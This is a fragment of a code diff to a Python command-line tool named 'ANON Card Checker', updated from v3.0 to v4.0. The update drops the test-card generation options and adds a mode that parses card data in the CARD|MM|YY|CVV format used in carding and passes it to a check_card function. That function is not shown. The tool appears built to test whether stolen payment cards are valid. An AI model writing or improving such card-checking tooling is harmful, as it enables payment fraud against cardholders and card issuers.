                 print(f"{fx.RED}❌ Invalid choice!{fx.RESET}")
 
@@ -457,25 +420,22 @@ class AnonCardChecker:
 
 def main():
     import argparse
-    parser = argparse.ArgumentParser(description="ANON Card Checker v3.0")
-    parser.add_argument("--check", "-c", type=str, help="Check single card (number|exp|cvv)")
-    parser.add_argument("--test", "-t", action="store_true", help="Generate test cards")
-    parser.add_argument("--realistic", "-r", action="store_true", help="Generate realistic cards")
+    parser = argparse.ArgumentParser(description="ANON Card Checker v4.0")
+    parser.add_argument("--check", "-c", type=str, help="Check single card (CARD|MM|YY|CVV)")
     args = parser.parse_args()
 
     checker = AnonCardChecker()
 
     if args.check:
-        parts = args.check.split("|")
-        number = parts[0]
-        expiry = parts[1] if len(parts) > 1 else ""
-        cvv = parts[2] if len(parts) > 2 else ""
-        result = checker.validate_single(number, expiry, cvv)
-        checker.display_result(result)
-    elif args.test:
-        checker.generate_test_cards(10)
-    elif args.realistic:
-        checker.generate_realistic(5)
+        p = args.check.split("|")
+        if len(p) >= 4:
+            number = p[0].strip().replace(" ", "").replace("-", "")
+            mm = p[1].strip().zfill(2)
+            yy = p[2].strip()
+            cvv = p[3].strip()
+            expiry = f"{mm}/{yy[-2:]}"
+            result = checker.check_card(number, expiry, cvv)
+            checker.display_result(result)
     else:
         checker.menu()
 
